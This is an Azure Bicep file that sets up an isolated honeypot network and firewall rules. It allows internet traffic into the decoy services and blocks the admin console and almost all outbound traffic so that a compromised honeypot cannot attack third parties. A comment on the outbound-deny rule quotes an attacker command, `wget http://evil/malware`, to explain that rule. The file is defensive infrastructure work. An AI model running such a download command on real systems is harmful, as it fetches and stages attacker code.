// Honeypot VNet — network-packets.com, deliberately exposed, fully isolated
// Design: ../../network-architecture.md section 4.2 and section 6

@description('Azure region.')
param location string

@description('Short environment suffix used in resource names.')
param env string

@description('Tags applied to every resource.')
param tags object

@description('Inbound ports deliberately exposed to the internet.')
param exposedPorts array

@description('Address space of the private lab VNet. Used ONLY to write an explicit deny rule against it.')
param labAddressSpace string

var addressSpace = '10.20.0.0/16'
var snetHoneypot = '10.20.1.0/24'

// 10.20.250.0/26 is RESERVED for AzureBastionSubnet, not deployed. Same
// rationale as the lab VNet.

resource nsgHoneypot 'Microsoft.Network/networkSecurityGroups@2024-05-01' = {
  name: 'nsg-df-honeypot-${env}'
  location: location
  tags: tags
  properties: {
    securityRules: [
      // -----------------------------------------------------------------
      // INBOUND — being attacked is the intended function (risk R-10,
      // accepted by design). This is the one place in the whole estate
      // where an allow-from-Internet rule is correct.
      // -----------------------------------------------------------------
      {
        name: 'Allow-Inbound-Honeypot-Services'
        properties: {
          priority: 100
          direction: 'Inbound'
          access: 'Allow'
          protocol: 'Tcp'
          sourceAddressPrefix: 'Internet'
          sourcePortRange: '*'
          destinationAddressPrefix: snetHoneypot
          destinationPortRanges: exposedPorts
          description: 'R-10 accepted by design: attacker interaction IS the product'
        }
      }
      {
        // The T-Pot / Cowrie management UI must NOT be internet-facing.
        // Exposing the console of the deception platform hands an attacker
        // the captured intelligence and the platform itself. Reached via
        // Bastion instead (decision D-03).
        name: 'Deny-Inbound-Honeypot-AdminUI'
        properties: {
          priority: 90
          direction: 'Inbound'
          access: 'Deny'
          protocol: '*'
          sourceAddressPrefix: 'Internet'
          sourcePortRange: '*'
          destinationAddressPrefix: snetHoneypot
          destinationPortRanges: [ '64294', '64295', '64297' ]
          description: 'T-Pot admin/web UI ports are Bastion-only, never internet-facing. Priority is deliberately ahead of the service allow rule.'
        }
      }

      // -----------------------------------------------------------------
      // OUTBOUND — the R-13 control.
      //
      // A compromised honeypot with unrestricted egress is a machine
      // registered to Aaron attacking third parties from a Data-Frames IP.
      // Azure allows all outbound by default, so NOT writing these rules
      // is itself a decision (decision D-02a, risk R-13, Policy section 7).
      // -----------------------------------------------------------------
      {
        // The ONLY data path out of this VNet: append-only writes to the
        // storage airlock. Note what is absent - there is no rule allowing
        // anything toward the lab, because no such path should exist.
        name: 'Allow-Outbound-Storage-Airlock'
        properties: {
          priority: 1000
          direction: 'Outbound'
          access: 'Allow'
          protocol: 'Tcp'
          sourceAddressPrefix: snetHoneypot
          sourcePortRange: '*'
          destinationAddressPrefix: 'Storage'
          destinationPortRange: '443'
          description: 'D-01: append-only log writes to the airlock. The honeypot never reads, lists, or deletes.'
        }
      }
      {
        // Belt and braces. No route to the lab VNet exists — the two VNets
        // are not peered and never will be (R-02). This rule changes no
        // behaviour; it exists so the INTENT is auditable in the rule set
        // and so any topology change that would make it matter generates
        // an alertable event. See section 6 of the design doc.
        name: 'Deny-Outbound-To-Lab-VNet-R02'
        properties: {
          priority: 1100
          direction: 'Outbound'
          access: 'Deny'
          protocol: '*'
          sourceAddressPrefix: '*'
          sourcePortRange: '*'
          destinationAddressPrefix: labAddressSpace
          destinationPortRange: '*'
          description: 'R-02: redundant by design. No route exists. Makes the segmentation intent auditable and any future violation alertable.'
        }
      }
      {
        name: 'Allow-Outbound-AzurePlatformDNS'
        properties: {
          priority: 1200
          direction: 'Outbound'
          access: 'Allow'
          protocol: '*'
          sourceAddressPrefix: '*'
          sourcePortRange: '*'
          destinationAddressPrefix: 'AzurePlatformDNS'
          destinationPortRange: '*'
          description: 'Azure platform DNS'
        }
      }
      {
        name: 'Allow-Outbound-AzurePlatformIMDS'
        properties: {
          priority: 1210
          direction: 'Outbound'
          access: 'Allow'
          protocol: '*'
          sourceAddressPrefix: '*'
          sourcePortRange: '*'
          destinationAddressPrefix: 'AzurePlatformIMDS'
          destinationPortRange: '*'
          description: 'Instance metadata service'
        }
      }
      {
        // Accepted tradeoff, recorded in D-02a: this reduces honeypot
        // realism. An attacker running `wget http://evil/malware` gets a
        // failure, which can tip them off. Taken anyway — the ATTEMPTED URL
        // is the intelligence. Fetching an attacker's payload over your own
        // IP buys a sample there is no safe detonation lab for yet, in
        // exchange for outbound liability.
        name: 'Deny-Outbound-Internet-R13'
        properties: {
          priority: 4010
          direction: 'Outbound'
          access: 'Deny'
          protocol: '*'
          sourceAddressPrefix: '*'
          sourcePortRange: '*'
          destinationAddressPrefix: 'Internet'
          destinationPortRange: '*'
          description: 'R-13: a compromised honeypot must not be able to attack third parties from a Data-Frames IP.'
        }
      }
    ]
  }
}

resource vnet 'Microsoft.Network/virtualNetworks@2024-05-01' = {
  name: 'vnet-df-honeypot-${env}'
  location: location
  tags: tags
  properties: {
    addressSpace: {
      addressPrefixes: [ addressSpace ]
    }
    subnets: [
      {
        name: 'snet-honeypot'
        properties: {
          addressPrefix: snetHoneypot
          networkSecurityGroup: { id: nsgHoneypot.id }
          // Service endpoint so log writes to the airlock traverse the Azure
          // backbone, not the public internet (decision D-01).
          serviceEndpoints: [ { service: 'Microsoft.Storage' } ]
        }
      }
    ]
  }
}

output vnetId string = vnet.id
output vnetName string = vnet.name
output addressSpace string = addressSpace
